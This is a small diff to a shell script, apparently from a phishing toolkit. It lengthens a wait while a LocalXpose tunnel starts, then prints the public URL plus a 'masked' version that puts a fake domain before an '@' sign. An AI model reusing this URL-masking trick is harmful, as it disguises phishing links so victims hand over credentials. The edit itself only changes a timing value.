@@ -490,7 +490,7 @@ start_loclx() {
         sleep 2 && ./.server/loclx tunnel H -t "$HOST":"$PORT" --https-redirect > .loclx 2>&1 &
     fi
 
-	{ sleep 8; clear; banner_small; }
+	{ sleep 12; clear; banner_small; }
 	loclx_url=$(cat .loclx | grep -o '[-0-9a-z]*\.loclx.io')
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
